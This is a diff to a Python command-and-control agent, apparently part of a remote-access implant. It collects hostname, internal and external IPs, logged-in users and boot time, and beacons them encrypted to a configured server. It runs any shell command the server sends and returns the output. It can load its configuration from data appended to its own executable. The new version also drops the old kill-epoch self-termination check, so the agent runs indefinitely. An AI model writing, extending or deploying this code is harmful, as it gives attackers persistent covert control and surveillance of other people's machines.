@@ -1,187 +1,183 @@
-#!/usr/bin/env python3
 """
-Python endpoint agent implementation.
-Handles encrypted C2 communication and command execution.
+Main agent implementation - handles C2 communication and task execution
 """
-
 import json
-import subprocess
 import time
-import uuid
-from typing import Dict, Any, Optional
+import socket
+import platform
+import subprocess
 import requests
-import logging
+import uuid
+from datetime import datetime
+from typing import Dict, Any, Optional
+from configure import load_config, read_binary_config
+from crypto import encrypt, decrypt
 
-from crypto_utils import decrypt_message, encrypt_message, decode_key_b64
-from config_manager import unpack_config
-
-
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
+def get_system_info() -> Dict[str, Any]:
+    """Collect system information for beacon"""
+    hostname = socket.gethostname()
+    
+    # Get internal IP
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        internal_ip = s.getsockname()[0]
+        s.close()
+    except Exception:
+        internal_ip = "unknown"
+    
+    # Get external IP
+    try:
+        external_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+    except Exception:
+        external_ip = "unknown"
+    
+    # Get users
+    try:
+        if platform.system() == "Windows":
+            result = subprocess.run(["query", "user"], capture_output=True, text=True)
+            users = result.stdout.strip() if result.returncode == 0 else "unknown"
+        else:
+            result = subprocess.run(["who"], capture_output=True, text=True)
+            users = result.stdout.strip() if result.returncode == 0 else "unknown"
+    except Exception:
+        users = "unknown"
+    
+    # Get boot time
+    try:
+        if platform.system() == "Windows":
+            result = subprocess.run(["systeminfo"], capture_output=True, text=True)
+            boot_time = "unknown"  # Would need to parse systeminfo output
+        else:
+            result = subprocess.run(["uptime", "-s"], capture_output=True, text=True)
+            boot_time = result.stdout.strip() if result.returncode == 0 else "unknown"
+    except Exception:
+        boot_time = "unknown"
+    
+    return {
+        "ip": internal_ip,
+        "external_ip": external_ip,
+        "hostname": hostname,
+        "os": platform.system(),
+        "arch": platform.machine(),
+        "users": users,
+        "boottime": boot_time,
+        "deploy_id": None  # Will be set by caller
+    }
 
 def execute_command(command: str) -> str:
-    """Execute shell command and return output."""
+    """Execute system command and return output"""
     try:
         result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
+            command, 
+            shell=True, 
+            capture_output=True, 
+            text=True, 
             timeout=30
         )
-        
         output = result.stdout
         if result.stderr:
             output += f"\nSTDERR: {result.stderr}"
         if result.returncode != 0:
             output += f"\nReturn code: {result.returncode}"
-            
-        return output.strip()
+        return output
     except subprocess.TimeoutExpired:
         return "Command timed out after 30 seconds"
     except Exception as e:
-        return f"Command execution failed: {str(e)}"
+        return f"Error executing command: {str(e)}"
 
-
-def make_callback_request(callback_url: str, deploy_id: str) -> Optional[str]:
-    """Make GET request to C2 server for tasks."""
+def send_beacon(server_url: str, deploy_id: str, agent_private_key: bytes, c2_public_key: bytes) -> Optional[Dict[str, Any]]:
+    """Send beacon to C2 server and get task"""
+    system_info = get_system_info()
+    system_info["deploy_id"] = deploy_id
+    
+    beacon_data = json.dumps(system_info).encode('utf-8')
+    encrypted_beacon = encrypt(beacon_data, c2_public_key, agent_private_key)
+    
     try:
-        params = {"deploy_id": deploy_id}
-        response = requests.get(callback_url, params=params, timeout=10)
-        
-        if response.status_code == 200:
-            return response.text
-        elif response.status_code == 204:
-            # No tasks available
-            return None
-        else:
-            logger.warning(f"Callback request failed with status {response.status_code}")
-            return None
-            
-    except requests.RequestException as e:
-        logger.error(f"Callback request failed: {e}")
-        return None
-
-
-def send_response(callback_url: str, response_data: Dict[str, Any], c2_pub_key: bytes, agent_priv_key: bytes) -> bool:
-    """Send encrypted response back to C2 server."""
-    try:
-        # Encrypt response
-        response_json = json.dumps(response_data)
-        encrypted_response = encrypt_message(response_json, c2_pub_key, agent_priv_key)
-        
-        # Send POST request
         response = requests.post(
-            callback_url,
-            data=encrypted_response,
-            headers={"Content-Type": "text/plain"},
+            f"{server_url}/beacon",
+            data=encrypted_beacon,
+            headers={"Content-Type": "application/octet-stream"},
             timeout=10
         )
         
-        return response.status_code == 200
-        
+        if response.status_code == 200 and response.content:
+            # Decrypt response
+            decrypted_data = decrypt(response.content, agent_private_key, c2_public_key)
+            if decrypted_data:
+                return json.loads(decrypted_data.decode('utf-8'))
     except Exception as e:
-        logger.error(f"Failed to send response: {e}")
-        return False
-
-
-def run_agent(config_data: bytes) -> None:
-    """Main agent execution loop."""
-    try:
-        # Unpack configuration
-        agent_pub_key, agent_priv_key, config = unpack_config(config_data)
-        
-        # Extract configuration values
-        deploy_id = config["deploy_id"]
-        interval = int(config["interval"]) / 1000.0  # Convert ms to seconds
-        callback_url = config["callback"]
-        c2_pub_key = decode_key_b64(config["c2_pub_key"])
-        kill_epoch = int(config["kill_epoch"])
-        
-        logger.info(f"Agent started - Deploy ID: {deploy_id}, Interval: {interval}s")
-        
-        while True:
-            # Check kill epoch
-            current_time = int(time.time())
-            if current_time >= kill_epoch:
-                logger.info("Kill epoch reached, terminating agent")
-                break
-            
-            # Make callback request
-            encrypted_task = make_callback_request(callback_url, deploy_id)
-            
-            if encrypted_task:
-                try:
-                    # Decrypt task
-                    task_json = decrypt_message(encrypted_task, c2_pub_key, agent_priv_key)
-                    task = json.loads(task_json)
-                    
-                    task_id = task["task_id"]
-                    task_num = task["task_num"]
-                    task_arg = task["task_arg"]
-                    
-                    logger.info(f"Received task {task_id}: {task_arg}")
-                    
-                    # Execute command
-                    output = execute_command(task_arg)
-                    
-                    # Prepare response
-                    response_data = {
-                        "task_id": task_id,
-                        "task_num": task_num,
-                        "task_result": output
-                    }
-                    
-                    # Send encrypted response
-                    success = send_response(callback_url, response_data, c2_pub_key, agent_priv_key)
-                    
-                    if success:
-                        logger.info(f"Response sent for task {task_id}")
-                    else:
-                        logger.error(f"Failed to send response for task {task_id}")
-                        
-                except Exception as e:
-                    logger.error(f"Task processing failed: {e}")
-            
-            # Sleep until next callback
-            time.sleep(interval)
-            
-    except Exception as e:
-        logger.error(f"Agent execution failed: {e}")
-        raise
-
-
-def main() -> None:
-    """Main entry point - loads embedded config and runs agent."""
-    # In a real implementation, this would read from embedded binary data
-    # For testing, we'll look for a config file
-    import sys
+        print(f"Beacon failed: {e}")
     
-    if len(sys.argv) != 2:
-        print("Usage: python agent.py <config_file>")
-        sys.exit(1)
-    
-    config_file = sys.argv[1]
+    return None
+
+def send_task_result(server_url: str, task_result: Dict[str, Any], agent_private_key: bytes, c2_public_key: bytes) -> None:
+    """Send task execution result back to C2"""
+    result_data = json.dumps(task_result).encode('utf-8')
+    encrypted_result = encrypt(result_data, c2_public_key, agent_private_key)
     
     try:
-        with open(config_file, 'rb') as f:
+        requests.post(
+            f"{server_url}/result",
+            data=encrypted_result,
+            headers={"Content-Type": "application/octet-stream"},
+            timeout=10
+        )
+    except Exception as e:
+        print(f"Result send failed: {e}")
+
+def main_loop(config_path: str = None) -> None:
+    """Main agent loop"""
+    # Load configuration from binary or file
+    if config_path:
+        with open(config_path, 'rb') as f:
             config_data = f.read()
+    else:
+        # Try to read from end of current executable
+        import sys
+        config_data = read_binary_config(sys.argv[0])
+    
+    agent_public_key, agent_private_key, config = load_config(config_data)
+    
+    server_url = config['server_url'].rstrip('/')
+    deploy_id = config['deploy_id']
+    callback_interval = config['callback_interval']
+    c2_public_key = config['c2_public_key']
+    
+    print(f"Agent started - Deploy ID: {deploy_id}")
+    print(f"Server: {server_url}")
+    print(f"Callback interval: {callback_interval}s")
+    
+    while True:
+        try:
+            # Send beacon and get task
+            task = send_beacon(server_url, deploy_id, agent_private_key, c2_public_key)
+            
+            if task:
+                print(f"Received task: {task['task_id']}")
+                
+                # Execute command
+                output = execute_command(task['task_arg'])
+                
+                # Send result
+                result = {
+                    "task_id": task['task_id'],
+                    "task_num": task['task_num'],
+                    "task_arg": task['task_arg'],
+                    "output": output,
+                    "timestamp": datetime.now().isoformat()
+                }
+                
+                send_task_result(server_url, result, agent_private_key, c2_public_key)
+                print(f"Task {task['task_id']} completed")
+            
+        except Exception as e:
+            print(f"Agent error: {e}")
         
-        if len(config_data) != 528:
-            print(f"Error: Config file must be exactly 528 bytes, got {len(config_data)}")
-            sys.exit(1)
-        
-        run_agent(config_data)
-        
-    except FileNotFoundError:
-        print(f"Error: Config file '{config_file}' not found")
-        sys.exit(1)
-    except Exception as e:
-        print(f"Error: {e}")
-        sys.exit(1)
-
+        time.sleep(callback_interval)
 
 if __name__ == "__main__":
-    main()
+    import sys
+    config_path = sys.argv[1] if len(sys.argv) > 1 else None
+    main_loop(config_path)
